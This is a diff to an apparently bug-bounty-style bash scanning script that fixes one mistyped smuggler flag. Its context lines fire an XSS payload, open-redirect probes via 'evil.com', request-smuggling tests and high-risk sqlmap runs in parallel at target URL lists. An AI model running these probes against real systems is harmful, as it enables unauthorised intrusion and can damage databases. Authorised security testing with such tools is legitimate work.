@@ -138,7 +138,7 @@ runInjections() {
     cat checkRedirect.txt | grep -a -i "\=http" | qsreplace "http://www.evil.com/" | xargs -P 50 -I % bash -c "curl -s -L '%' -I | grep \"evil.com\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q injects/redirect.txt &> /dev/null
     cat parameters/patterns/xssPatterns.txt | qsreplace "\"><img src=x onerror=confirm(document.domain)>" | xargs -P 50 -I % bash -c "curl -s -L '%' | grep \"<img src=x onerror=confirm(document.domain)>\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q injects/xss.txt &> /dev/null
     cat parameters/patterns/xssPatterns.txt | xargs -P 30 -I % bash -c "echo % | kxss" 2> /dev/null | anew -q injects/kxss.txt &> /dev/null
-    cat $targetList | xargs -P 50 -I % bash -c "python3 ~/tools/smuggler/smuggler.py -u '%' --log injects/smuggle.txt --quite 2> /dev/null" &> /dev/null
+    cat $targetList | xargs -P 50 -I % bash -c "python3 ~/tools/smuggler/smuggler.py -u '%' --log injects/smuggle.txt --quiet 2> /dev/null" &> /dev/null
     cat checkSQLI.txt | xargs -P 30 -I % bash -c "python3 ~/tools/sqlmap/sqlmap.py -u % -b --batch --disable-coloring --random-agent --risk 3 --level 5 --output-dir=injects/sql/ 2> /dev/null" &> /dev/null
     if [ -n "$bServer" ]
         then
